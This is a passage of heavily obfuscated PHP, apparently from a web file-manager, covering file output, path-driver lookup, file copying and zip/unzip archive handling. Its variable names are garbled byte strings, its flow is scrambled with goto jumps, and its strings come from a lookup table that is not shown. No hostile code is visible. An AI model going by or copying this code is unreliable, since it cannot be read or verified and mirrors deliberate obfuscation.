fileOut($eÙšÌåç…ê, $fŒÆâÙ×°ˆ = false, $D®Ûºß›‡Æ = false, $B‡ÙØëÈš = '') { $CŸø—œ”Ü° = self::driverMake($eÙšÌåç…ê); if ($CŸø—œ”Ü°->isFileOutServer()) { return $CŸø—œ”Ü°->fileOutServer($eÙšÌåç…ê, $fŒÆâÙ×°ˆ, $D®Ûºß›‡Æ, $B‡ÙØëÈš); } return $CŸø—œ”Ü°->fileOut($eÙšÌåç…ê, $fŒÆâÙ×°ˆ, $D®Ûºß›‡Æ, $B‡ÙØëÈš); } public static function fileOutImage($eò¼‡ÍµŞŞ, $f×†ˆ±£ÛÉ = 250) { $CÉ—ÊÄŞïË = array(250, 600, 1200, 3000, 5000); for ($Fñ´ä§•Æ = 0; $Fñ´ä§•Æ < count($CÉ—ÊÄŞïË); $Fñ´ä§•Æ++) { if ($Fñ´ä§•Æ == 0 && $f×†ˆ±£ÛÉ <= $CÉ—ÊÄŞïË[$Fñ´ä§•Æ]) { $f×†ˆ±£ÛÉ = $CÉ—ÊÄŞïË[$Fñ´ä§•Æ]; break; } else { if ($f×†ˆ±£ÛÉ > $CÉ—ÊÄŞïË[$Fñ´ä§•Æ - 1] && $f×†ˆ±£ÛÉ <= $CÉ—ÊÄŞïË[$Fñ´ä§•Æ]) { $f×†ˆ±£ÛÉ = $CÉ—ÊÄŞïË[$Fñ´ä§•Æ]; break; } else { if ($Fñ´ä§•Æ == count($CÉ—ÊÄŞïË) - 1 && $f×†ˆ±£ÛÉ > $CÉ—ÊÄŞïË[$Fñ´ä§•Æ]) { $f×†ˆ±£ÛÉ = $CÉ—ÊÄŞïË[$Fñ´ä§•Æ]; break; } } } } $bÍš¹–±±’ = self::driverMake($eò¼‡ÍµŞŞ); if ($bÍš¹–±±’->isFileOutServer()) { return $bÍš¹–±±’->fileOutImageServer($eò¼‡ÍµŞŞ, $f×†ˆ±£ÛÉ); } return $bÍš¹–±±’->fileOutImage($eò¼‡ÍµŞŞ, $f×†ˆ±£ÛÉ); } private static function driverIsSame($cÒ¶Çš ’, $EìåÂ‘èÊ•) { goto e…ÓŒÂ¡êí; e…ÓŒÂ¡êí: $A„ñ‘»ÉĞ =& $_SERVER[Ç³Íß¦Ó]; $Bá‘“ëåªÁ = $cÒ¶Çš ’->getType(); $CéÂÙœÀ¤© = $EìåÂ‘èÊ•->getType(); goto eí„‹¥–‹; eí„‹¥–‹: if ($Bá‘“ëåªÁ != $CéÂÙœÀ¤©) { return !1; } if ($Bá‘“ëåªÁ == $A„ñ‘»ÉĞ[719]) { return !0; } if ($Bá‘“ëåªÁ == $A„ñ‘»ÉĞ[106]) { return !0; } goto d¨„è¢É…³; d¨„è¢É…³: if ($cÒ¶Çš ’->pathDriver == $EìåÂ‘èÊ•->pathDriver) { return !0; } return !1; goto b÷ïî¼—¸; b÷ïî¼—¸: } public static function copyUpdate($a†ãÂÃß…, $eŸ·êŠˆÚ¯) { goto fò§Š Ñ„¹; bô­ ÊÏ„£: $D“ØğàÆñ‰ = array(); foreach ($cƒŞ†‹Çõ as $A³½‹ÊªÇ => $eĞ¾í‰óƒÁ) { if (isset($bØ²¤¦¬Ë‹[$A³½‹ÊªÇ])) { if ($eĞ¾í‰óƒÁ[$FÔÉ¾Ø‡¬æ[77]] == 1) { continue; } if ($bØ²¤¦¬Ë‹[$A³½‹ÊªÇ][$FÔÉ¾Ø‡¬æ[78]] == $eĞ¾í‰óƒÁ[$FÔÉ¾Ø‡¬æ[78]]) { continue; } } if ($eĞ¾í‰óƒÁ[$FÔÉ¾Ø‡¬æ[77]] == 1) { $D“ØğàÆñ‰[] = $eŸ·êŠˆÚ¯ . $FÔÉ¾Ø‡¬æ[8] . $A³½‹ÊªÇ; continue; } $dÒ±¿æ¦¯¶ = strstr(trim($A³½‹ÊªÇ, $FÔÉ¾Ø‡¬æ[8]), $FÔÉ¾Ø‡¬æ[8]) ? get_path_father($A³½‹ÊªÇ) : $FÔÉ¾Ø‡¬æ[33]; $eæÉ‹Ï¶¡ö[] = array($FÔÉ¾Ø‡¬æ[1055] => $eĞ¾í‰óƒÁ[$FÔÉ¾Ø‡¬æ[76]], $FÔÉ¾Ø‡¬æ[1056] => rtrim($eŸ·êŠˆÚ¯, $FÔÉ¾Ø‡¬æ[8]) . $FÔÉ¾Ø‡¬æ[8] . $dÒ±¿æ¦¯¶, $FÔÉ¾Ø‡¬æ[1057] => $eĞ¾í‰óƒÁ); } $b†êäŒË„Œ = array($FÔÉ¾Ø‡¬æ[192] => $eæÉ‹Ï¶¡ö, $FÔÉ¾Ø‡¬æ[77] => $D“ØğàÆñ‰); goto B™åê³‹ï; fò§Š Ñ„¹: $FÔÉ¾Ø‡¬æ =& $_SERVER[Ç³Íß¦Ó]; if (!IO::exist($a†ãÂÃß…)) { return !1; } if (!IO::exist($eŸ·êŠˆÚ¯)) { IO::mkdir($eŸ·êŠˆÚ¯); } goto c´¸ô‚Œì§; B™åê³‹ï: Hook::trigger($FÔÉ¾Ø‡¬æ[1058], $a†ãÂÃß…, $eŸ·êŠˆÚ¯, $b†êäŒË„Œ); foreach ($D“ØğàÆñ‰ as $eĞ¾í‰óƒÁ) { IO::mkdir($eĞ¾í‰óƒÁ); } foreach ($eæÉ‹Ï¶¡ö as $eĞ¾í‰óƒÁ) { IO::copy($eĞ¾í‰óƒÁ[$FÔÉ¾Ø‡¬æ[1055]], $eĞ¾í‰óƒÁ[$FÔÉ¾Ø‡¬æ[1056]], REPEAT_REPLACE); } goto BİŸ‹ÄôÇ; c´¸ô‚Œì§: $cƒŞ†‹Çõ = self::_listAll($a†ãÂÃß…); $bØ²¤¦¬Ë‹ = self::_listAll($eŸ·êŠˆÚ¯); $eæÉ‹Ï¶¡ö = array(); goto bô­ ÊÏ„£; BİŸ‹ÄôÇ: } private static function _listAll($C†á²Èäğ³) { $f–²ê¤²›ˆ =& $_SERVER[Ç³Íß¦Ó]; $C†á²Èäğ³ = KodIO::clear($C†á²Èäğ³); $DåÎ±¥ß¶õ = IO::listAll($C†á²Èäğ³); foreach ($DåÎ±¥ß¶õ as &$d‘ÖÇ÷Ó™Í) { $B‘òœš‘ô = substr($d‘ÖÇ÷Ó™Í[$f–²ê¤²›ˆ[76]], strlen($C†á²Èäğ³)); $d‘ÖÇ÷Ó™Í[$f–²ê¤²›ˆ[1059]] = trim($B‘òœš‘ô, $f–²ê¤²›ˆ[8]); } unset($d‘ÖÇ÷Ó™Í); return array_to_keyvalue($DåÎ±¥ß¶õ, $f–²ê¤²›ˆ[1059]); } public static function fileSubstr($eÉ¡Ë…İãé, $aŸ¸ÚÉ¢ª†, $dÒ§ë©¢‹˜ = false) { goto B•¼àôê–Ë; B•¼àôê–Ë: $a©‡÷œ³‡ =& $_SERVER[Ç³Íß¦Ó]; $aÑººê¡¸É = self::driverMake($eÉ¡Ë…İãé); $DôğÀ’ŠÃ = $aÑººê¡¸É->size($eÉ¡Ë…İãé); goto bËÉ‚›Ò…¢; a­ÒÕ©ö¨: if ($dÒ§ë©¢‹˜ <= 0) { return $a©‡÷œ³‡[33]; } if ($aŸ¸ÚÉ¢ª† < 0 || $aŸ¸ÚÉ¢ª† >= $DôğÀ’ŠÃ || $dÒ§ë©¢‹˜ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\145\x52\x65\x61\144\40\x65\x72\x72\x6f\162\41\x20\163\164\x61\x72\164\75{$aŸ¸ÚÉ¢ª†}\x3b\x6c\x65\156\x67\x74\x68\75{$dÒ§ë©¢‹˜}\73\x20\163\151\172\x65\75{$DôğÀ’ŠÃ}\x3b"); } $AØø­Šé¼ = $aÑººê¡¸É->fileSubstr($eÉ¡Ë…İãé, $aŸ¸ÚÉ¢ª†, $dÒ§ë©¢‹˜); goto AÚ¹—º™È; AÚ¹—º™È: if (!$AØø­Šé¼ && $dÒ§ë©¢‹˜ && isset($GLOBALS[$a©‡÷œ³‡[1062]])) { throw new Exception($GLOBALS[$a©‡÷œ³‡[1062]][$a©‡÷œ³‡[1063]]); } return $AØø­Šé¼; goto açĞöƒ¯ÇÄ; bñßáàÉáÓ: if ($dÒ§ë©¢‹˜ === !1) { $dÒ§ë©¢‹˜ = $DôğÀ’ŠÃ - $aŸ¸ÚÉ¢ª†; } if ($aŸ¸ÚÉ¢ª† + $dÒ§ë©¢‹˜ > $DôğÀ’ŠÃ) { $dÒ§ë©¢‹˜ = $DôğÀ’ŠÃ - $aŸ¸ÚÉ¢ª†; } if (!$DôğÀ’ŠÃ && $aÑººê¡¸É->getType() == $a©‡÷œ³‡[106] && !$aÑººê¡¸É->exist($eÉ¡Ë…İãé)) { throw new Exception($a©‡÷œ³‡[1060] . LNG($a©‡÷œ³‡[1061]) . $a©‡÷œ³‡[924] . get_path_this($eÉ¡Ë…İãé) . $a©‡÷œ³‡[33]); } goto a­ÒÕ©ö¨; bËÉ‚›Ò…¢: $AÃÊøâñØÎ = $aŸ¸ÚÉ¢ª†; $b¶—×‰‰±Æ = $dÒ§ë©¢‹˜; if ($aŸ¸ÚÉ¢ª† < 0) { $aŸ¸ÚÉ¢ª† = $DôğÀ’ŠÃ + $aŸ¸ÚÉ¢ª†; } goto bñßáàÉáÓ; açĞöƒ¯ÇÄ: } private static function driverMake(&$FéØ³Ìğƒˆ) { goto DòÕ«¢ñ®ø; DòÕ«¢ñ®ø: $a»Ë—„¦½Ú =& $_SERVER[Ç³Íß¦Ó]; $Fô¢š°ã‡³ = KodIO::parse($FéØ³Ìğƒˆ); if (!self::$driverListSystem) { $Bµ×Í÷¤¤‡ = Model($a»Ë—„¦½Ú[728])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Bµ×Í÷¤¤‡, $a»Ë—„¦½Ú[392]); } goto eÜÓÜ”ÆÜ‹; eÜÓÜ”ÆÜ‹: if ($Fô¢š°ã‡³[$a»Ë—„¦½Ú[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Fô¢š°ã‡³[$a»Ë—„¦½Ú[392]]]) { return !1; } $FéØ³Ìğƒˆ = $Fô¢š°ã‡³[$a»Ë—„¦½Ú[1064]]; $AÒ­‘Ìº¥ = self::driverGet($Fô¢š°ã‡³, $FéØ³Ìğƒˆ); goto Dß„¡¼á†ˆ; Dß„¡¼á†ˆ: return $AÒ­‘Ìº¥; goto a‡³À÷Ğ¨«; a‡³À÷Ğ¨«: } private static function driverGet($CàÚØì±¿†, &$E›ŒæÈËùÏ) { goto eèæ„ĞÚ¾ó; eèæ„ĞÚ¾ó: $EÂÙŠ¸ª»Ğ =& $_SERVER[Ç³Íß¦Ó]; $c‹ã•“Ä‹Ì = $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[1065]]; $d‚Ó¨ÉÒîø = $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[392]]; goto AØ£ïÉÏŠó; e¨ÓÆİîêí: $fâÃ“¨ªÚ‰ = self::$driverCache[$D‚ƒ¢™™Şó]; $fâÃ“¨ªÚ‰->pathDriver = $c‹ã•“Ä‹Ì; $fâÃ“¨ªÚ‰->pathBase = $EÂÙŠ¸ª»Ğ[33]; goto E¢´ƒòø´; AØ£ïÉÏŠó: switch ($CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[29]]) { case KodIO::KOD_IO: $B£ÛéåŒÀÎ = self::$driverListSystem[$d‚Ó¨ÉÒîø]; break; case KodIO::KOD_SOURCE: $E›ŒæÈËùÏ = $d‚Ó¨ÉÒîø . $E›ŒæÈËùÏ; $B£ÛéåŒÀÎ = array($EÂÙŠ¸ª»Ğ[1066] => $EÂÙŠ¸ª»Ğ[1067], $EÂÙŠ¸ª»Ğ[6] => $CàÚØì±¿†); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $bÆİÁƒ”Ğ = $GLOBALS[$EÂÙŠ¸ª»Ğ[1068]]; self::$driverListUser = array_to_keyvalue($bÆİÁƒ”Ğ, $EÂÙŠ¸ª»Ğ[392]); } $B£ÛéåŒÀÎ = self::$driverListUser[$d‚Ó¨ÉÒîø]; break; case KodIO::KOD_SHARE_LINK: $B£ÛéåŒÀÎ = array($EÂÙŠ¸ª»Ğ[1066] => $EÂÙŠ¸ª»Ğ[1069], $EÂÙŠ¸ª»Ğ[6] => $CàÚØì±¿†); $CïÑ×Ï‚Ó = Action($EÂÙŠ¸ª»Ğ[1070])->sharePathInfo($CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[76]]); $E›ŒæÈËùÏ = $CïÑ×Ï‚Ó[$EÂÙŠ¸ª»Ğ[394]]; if (!$CïÑ×Ï‚Ó[$EÂÙŠ¸ª»Ğ[394]]) { $BÜ¤­öİ¥ = Model($EÂÙŠ¸ª»Ğ[562])->getInfo($CïÑ×Ï‚Ó[$EÂÙŠ¸ª»Ğ[466]]); $E›ŒæÈËùÏ = KodIO::clear($BÜ¤­öİ¥[$EÂÙŠ¸ª»Ğ[1071]] . $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[1064]]); $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[464]] = $BÜ¤­öİ¥; $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[1048]] = $E›ŒæÈËùÏ; $B£ÛéåŒÀÎ = array($EÂÙŠ¸ª»Ğ[1066] => $EÂÙŠ¸ª»Ğ[1072], $EÂÙŠ¸ª»Ğ[6] => $CàÚØì±¿†); } break; case KodIO::KOD_SHARE_ITEM: $B£ÛéåŒÀÎ = array($EÂÙŠ¸ª»Ğ[1066] => $EÂÙŠ¸ª»Ğ[1073], $EÂÙŠ¸ª»Ğ[6] => $CàÚØì±¿†); $BÜ¤­öİ¥ = Model($EÂÙŠ¸ª»Ğ[562])->getInfo($CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[392]]); if ($BÜ¤­öİ¥[$EÂÙŠ¸ª»Ğ[394]] == $EÂÙŠ¸ª»Ğ[495]) { $E›ŒæÈËùÏ = KodIO::clear($BÜ¤­öİ¥[$EÂÙŠ¸ª»Ğ[1071]] . $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[1064]]); $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[464]] = $BÜ¤­öİ¥; $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[1048]] = $E›ŒæÈËùÏ; $B£ÛéåŒÀÎ = array($EÂÙŠ¸ª»Ğ[1066] => $EÂÙŠ¸ª»Ğ[1074], $EÂÙŠ¸ª»Ğ[6] => $CàÚØì±¿†); } else { if (!$E›ŒæÈËùÏ) { $E›ŒæÈËùÏ = $BÜ¤­öİ¥[$EÂÙŠ¸ª»Ğ[394]]; } } break; default: $E›ŒæÈËùÏ = $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[76]]; $B£ÛéåŒÀÎ = array($EÂÙŠ¸ª»Ğ[1066] => $EÂÙŠ¸ª»Ğ[1075]); break; } $D‚ƒ¢™™Şó = $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[76]]; if (!isset(self::$driverCache[$D‚ƒ¢™™Şó])) { $B•‹Õ‹ô· = strtolower($B£ÛéåŒÀÎ[$EÂÙŠ¸ª»Ğ[94]]); $dÌË–‚ª = $GLOBALS[$EÂÙŠ¸ª»Ğ[6]][$EÂÙŠ¸ª»Ğ[88]][$EÂÙŠ¸ª»Ğ[792]]; $d²ÙÊ»æŠ = $EÂÙŠ¸ª»Ğ[72] . (isset($dÌË–‚ª[$B•‹Õ‹ô·]) ? $dÌË–‚ª[$B•‹Õ‹ô·] : ucfirst($B•‹Õ‹ô·)); if (!class_exists($d²ÙÊ»æŠ)) { show_json("{$d²ÙÊ»æŠ}\40\x6e\x6f\x74\x20\x65\x78\x69\163\164\163\41", !1); } $cƒì¬—¸Õç = isset($B£ÛéåŒÀÎ[$EÂÙŠ¸ª»Ğ[6]]) ? $B£ÛéåŒÀÎ[$EÂÙŠ¸ª»Ğ[6]] : !1; self::$driverCache[$D‚ƒ¢™™Şó] = new $d²ÙÊ»æŠ($cƒì¬—¸Õç); } goto e¨ÓÆİîêí; E¢´ƒòø´: if (isset($B£ÛéåŒÀÎ[$EÂÙŠ¸ª»Ğ[6]][$EÂÙŠ¸ª»Ğ[1076]])) { $fâÃ“¨ªÚ‰->pathBase = rtrim($B£ÛéåŒÀÎ[$EÂÙŠ¸ª»Ğ[6]][$EÂÙŠ¸ª»Ğ[1076]], $EÂÙŠ¸ª»Ğ[8]) . $EÂÙŠ¸ª»Ğ[8]; $E›ŒæÈËùÏ = $fâÃ“¨ªÚ‰->pathBase . ltrim($E›ŒæÈËùÏ, $EÂÙŠ¸ª»Ğ[8]); } $E›ŒæÈËùÏ = $fâÃ“¨ªÚ‰->getPath($E›ŒæÈËùÏ); if (isset($CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[1048]])) { $E›ŒæÈËùÏ = $CàÚØì±¿†[$EÂÙŠ¸ª»Ğ[1048]]; } goto dº›±¼¤¬; dº›±¼¤¬: $fâÃ“¨ªÚ‰->path = $E›ŒæÈËùÏ; return $fâÃ“¨ªÚ‰; goto D‹‹‚ö¾Á; D‹‹‚ö¾Á: } public static function errorTips($a´Š„Ì„ = false) { goto CŸ…™¼ÆÆ; eå»œ§áÃ˜: if ($a´Š„Ì„ === -1) { return $cò×¶¸†’¤ ? $cò×¶¸†’¤[count($cò×¶¸†’¤) - 1] : $fò¥ÈŞµÍë[33]; } if ($a´Š„Ì„ === !1) { return implode($fò¥ÈŞµÍë[228], $cò×¶¸†’¤); } if (count($cò×¶¸†’¤) >= $EÃƒ‘Å¥Ø®) { $cò×¶¸†’¤ = array_slice($cò×¶¸†’¤, $EÃƒ‘Å¥Ø® * 0.5, $EÃƒ‘Å¥Ø®); } goto FëÒì‹¢Ã; CŸ…™¼ÆÆ: $fò¥ÈŞµÍë =& $_SERVER[Ç³Íß¦Ó]; static $cò×¶¸†’¤ = array(); $EÃƒ‘Å¥Ø® = 1000; goto eå»œ§áÃ˜; FëÒì‹¢Ã: $cò×¶¸†’¤[] = $a´Š„Ì„; write_log($fò¥ÈŞµÍë[160] . ACTION . $fò¥ÈŞµÍë[1077] . $a´Š„Ì„, $fò¥ÈŞµÍë[1078]); goto BÉùçà ½; BÉùçà ½: } public static function getLastError($CÁ›óÀÀ›ß = '') { $b¥‘óòäïá = self::errorTips(-1); return $b¥‘óòäïá ? $b¥‘óòäïá : $CÁ›óÀÀ›ß; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $CÌÂÂÍôÊ; if (!$CÌÂÂÍôÊ) { $F¯†•Âª¼¬ = IO::init($_SERVER[Ç³Íß¦Ó][8]); } return $F¯†•Âª¼¬; } private static function iconvSystem($b—ÎŸ‡‘ÜÑ) { return self::local()->iconvSystem($b—ÎŸ‡‘ÜÑ); } private static function iconvApp($f…ñ‚ä…âÊ) { return self::local()->iconvApp($f…ñ‚ä…âÊ); } public static function zip($AË‹éâ„«, $A¥ÂˆÖ²é = "\x7a\x69\x70", $a§Š®à¸®ì = '', $a’ÆÃÒñàë = REPEAT_RENAME) { goto d»‹‰ŠæÎ; fë‡Õ·Æ—³: foreach ($F™Æ©ØÑÂ½ as $dšäÑó§¼Ü => $BÔ¶™ƒë°ò) { $F™Æ©ØÑÂ½[$dšäÑó§¼Ü] = self::iconvSystem($BÔ¶™ƒë°ò); } KodArchive::create($c°Â¯ö³, $F™Æ©ØÑÂ½); if (!IO::exist($AœË¬¡½æç)) { if ($c¿í…Í ÎÚ) { del_dir($c¿í…Í ÎÚ); } show_json(LNG($C°¬ÓŠ²çô[1081]), !1); } goto dÆ¬ëò„÷¤; d½¹³‡¡‚µ: $c¿í…Í ÎÚ = !1; if (!$a§Š®à¸®ì && $F™‘ñ•°½õ->getType() == $C°¬ÓŠ²çô[106]) { $F™Æ©ØÑÂ½ = self::zipFileList($AË‹éâ„«); } else { $c¿í…Í ÎÚ = $a§Š®à¸®ì ? $a§Š®à¸®ì : TEMP_FILES . $C°¬ÓŠ²çô[1079] . time() . rand_string(8) . $C°¬ÓŠ²çô[8]; mk_dir($c¿í…Í ÎÚ); $F™Æ©ØÑÂ½ = self::zipFileList($AË‹éâ„«, $c¿í…Í ÎÚ); } $fÛäµ÷Ç„Ğ = $EíÏƒš¬¦“[$C°¬ÓŠ²çô[28]]; goto fÙìÃ¨Æ³’; D²•Ğ’‚ñŸ: $AœË¬¡½æç = $E„îóã—¡• . $fÛäµ÷Ç„Ğ . $C°¬ÓŠ²çô[95] . $A¥ÂˆÖ²é; $AœË¬¡½æç = get_filename_auto($AœË¬¡½æç, $C°¬ÓŠ²çô[33], $a’ÆÃÒñàë); $c°Â¯ö³ = self::iconvSystem($AœË¬¡½æç); goto fë‡Õ·Æ—³; fÙìÃ¨Æ³’: if (count($F™Æ©ØÑÂ½) > 1) { $Bâò£® = IO::info(IO::pathFather($EíÏƒš¬¦“[$C°¬ÓŠ²çô[76]])); $fÛäµ÷Ç„Ğ = $Bâò£®[$C°¬ÓŠ²çô[28]]; } $E„îóã—¡• = $c¿í…Í ÎÚ; if (!$E„îóã—¡•) { $E„îóã—¡• = get_path_father($EíÏƒš¬¦“[$C°¬ÓŠ²çô[76]]); if (!$a§Š®à¸®ì && $F™‘ñ•°½õ->getType() == $C°¬ÓŠ²çô[106]) { $E„îóã—¡• = get_path_father($F™‘ñ•°½õ->path); } $cÅİ‹§Š®Ê = IO::info($E„îóã—¡•); if (!$cÅİ‹§Š®Ê[$C°¬ÓŠ²çô[195]]) { show_json(LNG($C°¬ÓŠ²çô[1080]), !1); } } goto D²•Ğ’‚ñŸ; D¯Áôš¯Ü–: if (!$D‰Òâº‰ÃÙ) { del_dir($c¿í…Í ÎÚ); show_json(LNG($C°¬ÓŠ²çô[1081]), !1); } del_dir($c¿í…Í ÎÚ); return $D‰Òâº‰ÃÙ; goto FïÖŞ¾Ä¥Å; dÆ¬ëò„÷¤: if ($a§Š®à¸®ì || !$c¿í…Í ÎÚ) { if ($c¿í…Í ÎÚ && strstr($c¿í…Í ÎÚ, TEMP_FILES)) { $b’‹­‘Áß = $F™Æ©ØÑÂ½ = array(); recursion_dir($E„îóã—¡•, $b’‹­‘Áß, $F™Æ©ØÑÂ½, 0); foreach ($b’‹­‘Áß as $E–‹—Àæ) { del_dir($E–‹—Àæ); } foreach ($F™Æ©ØÑÂ½ as $b‹÷æÜš²å) { if ($b‹÷æÜš²å == $c°Â¯ö³) { continue; } del_file($b‹÷æÜš²å); } } return $AœË¬¡½æç; } $F¨·®Óš = self::pathFather($EíÏƒš¬¦“[$C°¬ÓŠ²çô[76]]); $D‰Òâº‰ÃÙ = self::move($AœË¬¡½æç, $F¨·®Óš, $a’ÆÃÒñàë); goto D¯Áôš¯Ü–; d»‹‰ŠæÎ: $C°¬ÓŠ²çô =& $_SERVER[Ç³Íß¦Ó]; $F™‘ñ•°½õ = self::init($AË‹éâ„«[0][$C°¬ÓŠ²çô[76]]); $EíÏƒš¬¦“ = self::info($AË‹éâ„«[0][$C°¬ÓŠ²çô[76]]); goto d½¹³‡¡‚µ; FïÖŞ¾Ä¥Å: } public static function unzip($d´¶–ôÏì‰, $f¹Û—öçÜË = "\162\x65\x70\154\141\143\x65") { goto C¾ÖÅ”ìÊµ; dÑ§«•ˆ: if (!($cË¾¸À³é = parent::info($Eáœ‘Ó©øó))) { show_json(LNG($Bê„Ñ£¼Ğ[1083]), !1); } if (!($f™¹È¢ğŒ˜ = parent::infoFull($f®ÕİÌÁÁ))) { $f®ÕİÌÁÁ = parent::mkdir($f®ÕİÌÁÁ); $f™¹È¢ğŒ˜ = array($Bê„Ñ£¼Ğ[76] => $f®ÕİÌÁÁ); } else { if (isset($f™¹È¢ğŒ˜[$Bê„Ñ£¼Ğ[394]]) && trim($f™¹È¢ğŒ˜[$Bê„Ñ£¼Ğ[76]], $Bê„Ñ£¼Ğ[8]) != trim($f®ÕİÌÁÁ, $Bê„Ñ£¼Ğ[8])) { $Bƒ‹µóçë¨ = KodIO::make($f™¹È¢ğŒ˜[$Bê„Ñ£¼Ğ[476]]); $AÕ‘¹åÅ = parent::fileNameAuto($Bƒ‹µóçë¨, $f™¹È¢ğŒ˜[$Bê„Ñ£¼Ğ[28]], REPEAT_RENAME_FOLDER, !0); $f®ÕİÌÁÁ = parent::mkdir($Bƒ‹µóçë¨ . $AÕ‘¹åÅ); $f™¹È¢ğŒ˜ = array($Bê„Ñ£¼Ğ[76] => $f®ÕİÌÁÁ); } } $f®ÕİÌÁÁ = $f™¹È¢ğŒ˜[$Bê„Ñ£¼Ğ[76]]; goto cÎÖ‘¼½Õğ; f¥­ã»Ú: foreach ($f”†ØÖóÆ as $CŠ„•æÚ) { $CŠ„•æÚ = self::iconvApp($CŠ„•æÚ); self::move($CŠ„•æÚ, $f®ÕİÌÁÁ, $f¹Û—öçÜË); } del_dir($c‚ƒ¬Ÿ“¹‡); if (!$C¡…à¥ñ¨¿) { del_file($b™Ê•îë¿¤); } goto Aõ’Ğ™³¼ó; BÁ£†ÑìÁ: Hook::trigger($Bê„Ñ£¼Ğ[1089], $c‚ƒ¬Ÿ“¹‡); recursion_dir($c‚ƒ¬Ÿ“¹‡, $e¼¾ˆÏ±Ş­, $C‚›×…ÙÎ, 0); $f”†ØÖóÆ = array_merge($e¼¾ˆÏ±Ş­, $C‚›×…ÙÎ); goto f¥­ã»Ú; cÎÖ‘¼½Õğ: $cçÀİèêò = self::tmpFileName($cË¾¸À³é); $c‚ƒ¬Ÿ“¹‡ = TEMP_FILES . $cçÀİèêò; del_dir($c‚ƒ¬Ÿ“¹‡); goto A¹œ—ÊóÇ; C¾ÖÅ”ìÊµ: $Bê„Ñ£¼Ğ =& $_SERVER[Ç³Íß¦Ó]; $Eáœ‘Ó©øó = $d´¶–ôÏì‰[$Bê„Ñ£¼Ğ[76]]; $f®ÕİÌÁÁ = $d´¶–ôÏì‰[$Bê„Ñ£¼Ğ[1082]]; goto dÑ§«•ˆ; Aõ’Ğ™³¼ó: return !0; goto Bí™ÏÛµÅª; A¹œ—ÊóÇ: mk_dir($c‚ƒ¬Ÿ“¹‡); $aÏ´‘ŒŒœÜ = self::fileExt($cË¾¸À³é); $b™Ê•îë¿¤ = $c‚ƒ¬Ÿ“¹‡ . $Bê„Ñ£¼Ğ[95] . $aÏ´‘ŒŒœÜ; goto F“•ôôğÅ§; F“•ôôğÅ§: if (!@file_exists(self::iconvSystem($b™Ê•îë¿¤))) { $C¡…à¥ñ¨¿ = self::localFilePath($Eáœ‘Ó©øó, $aÏ´‘ŒŒœÜ); $b™Ê•îë¿¤ = $C¡…à¥ñ¨¿ ? $C¡…à¥ñ¨¿ : parent::download($Eáœ‘Ó©øó, $b™Ê•îë¿¤); } $b™Ê•îë¿¤ = self::iconvSystem($b™Ê•îë¿¤); $AÏ¼»à¶Ğ´ = isset($d´¶–ôÏì‰[$Bê„Ñ£¼Ğ[1084]]) ? $d´¶–ôÏì‰[$Bê„Ñ£¼Ğ[1084]] : $Bê„Ñ£¼Ğ[1085]; goto fÎç¬õÓÇ; fÎç¬õÓÇ: $cëÍƒ—ç™Ò = KodArchive::extract($b™Ê•îë¿¤, $c‚ƒ¬Ÿ“¹‡ . $Bê„Ñ£¼Ğ[8], $AÏ¼»à¶Ğ´); self::archiveExt(); if (!$cëÍƒ—ç™Ò[$Bê„Ñ£¼Ğ[1086]]) { show_json($Bê„Ñ£¼Ğ[1087] . $cëÍƒ—ç™Ò[$Bê„Ñ£¼Ğ[1088]], !1); } goto BÁ£†ÑìÁ; Bí™ÏÛµÅª: } public static function unzipList($c²…ÔÇ›îà) { goto C¿™³Æ„ò; D‰«ÈÏãª: if (!is_dir($BºìÆ†æ°´)) { mk_dir($BºìÆ†æ°´); } $e¡æ—À¬¿Ó = $BºìÆ†æ°´ . $B‰ƒ¶Éƒ‚à[8] . $F‰Í–¶œÒ·; if (!@file_exists(self::iconvSystem($e¡æ—À¬¿Ó))) { if (isset($cğ„èãŠÛ)) { url_request($a³õ½´•ì, $B‰ƒ¶Éƒ‚à[1093], $e¡æ—À¬¿Ó); } else { $Eò¶óÌ†± = self::localFilePath($a³õ½´•ì, $d“­´ËÀºì); $e¡æ—À¬¿Ó = $Eò¶óÌ†± ? $Eò¶óÌ†± : self::download($a³õ½´•ì, $e¡æ—À¬¿Ó); } } goto bæÖÄ¤¼‘‚; cñ˜¿çã¾—: $fƒßÈå¿ˆÈ = json_encode($a˜Úœ‘ò­¾[$B‰ƒ¶Éƒ‚à[1088]]); self::setContent($eô—Ñò¼ß‰, $fƒßÈå¿ˆÈ); if (count($a˜Úœ‘ò­¾[$B‰ƒ¶Éƒ‚à[1088]]) >= $bİİÏÄ¶É) { show_json(sprintf(LNG($B‰ƒ¶Éƒ‚à[1092]), count($a˜Úœ‘ò­¾[$B‰ƒ¶Éƒ‚à[1088]])), !1); } goto C„Ì«“‹åˆ; b¨ßŸ•á¯: $C’¨’èˆ¬ = self::info($e¤‰‚À¹¤•); $d“­´ËÀºì = self::fileExt($C’¨’èˆ¬); $B£ÉÚªÉÉñ = self::tmpFileName($C’¨’èˆ¬); goto fø‹õóÈ…; aŠÏàÒ©: $bİİÏÄ¶É = 50000; if (request_url_safe($a³õ½´•ì)) { $cğ„èãŠÛ = parse_url_query($a³õ½´•ì); if (!isset($cğ„èãŠÛ[$B‰ƒ¶Éƒ‚à[76]])) { show_json($B‰ƒ¶Éƒ‚à[1091], !1); } } $e¤‰‚À¹¤• = isset($cğ„èãŠÛ) ? $cğ„èãŠÛ[$B‰ƒ¶Éƒ‚à[76]] : $a³õ½´•ì; goto b¨ßŸ•á¯; bæÖÄ¤¼‘‚: $e¡æ—À¬¿Ó = self::iconvSystem($e¡æ—À¬¿Ó); if ($bªÄÇè¥Ô >= 0) { $e—½İ£µ«› = 